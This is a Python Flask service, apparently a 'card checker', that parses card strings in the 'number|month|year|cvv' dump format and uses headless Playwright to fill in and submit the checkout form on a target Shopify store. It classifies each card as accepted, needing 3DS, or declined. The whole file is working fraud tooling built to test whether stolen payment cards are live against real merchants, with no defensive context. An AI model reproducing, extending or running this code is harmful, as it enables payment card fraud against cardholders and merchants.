import os
import re
import asyncio
from flask import Flask, request, jsonify
from playwright.async_api import async_playwright

app = Flask(__name__)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, month, year, cvv = match.groups()
        if len(year) == 2:
            year = '20' + year
        return card, month, year, cvv
    return None, None, None, None

async def check_shopify(site, card, month, year, cvv):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        page = await browser.new_page()
        try:
            await page.goto(site, timeout=15000, wait_until='domcontentloaded')
            await page.goto(f"{site}/checkout", timeout=30000, wait_until='networkidle')
            await page.fill('input[name="checkout[credit_card][number]"]', card)
            await page.fill('input[name="checkout[credit_card][month]"]', month)
            await page.fill('input[name="checkout[credit_card][year]"]', year)
            await page.fill('input[name="checkout[credit_card][verification_value]"]', cvv)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)
            content = await page.content()
            if "thank_you" in page.url.lower() or "order" in page.url.lower():
                return {"Response": "Order placed", "Price": 0, "Gateway": "Shopify"}
            elif "3d" in content.lower() or "authenticate" in content.lower():
                return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify"}
            else:
                return {"Response": "Declined", "Price": 0, "Gateway": "Shopify"}
        except Exception as e:
            return {"Response": f"Error: {str(e)[:50]}", "Price": 0, "Gateway": "Shopify"}
        finally:
            await browser.close()

@app.route('/shopify', methods=['GET'])
def shopify_check():
    site = request.args.get('site')
    cc = request.args.get('cc')
    if not site or not cc:
        return jsonify({"Response": "Missing site or cc", "Price": 0, "Gateway": "Shopify"}), 400
    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"Response": "Invalid cc", "Price": 0, "Gateway": "Shopify"}), 400
    if not site.startswith('http'):
        site = 'https://' + site
    result = asyncio.run(check_shopify(site, card, month, year, cvv))
    return jsonify(result)

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
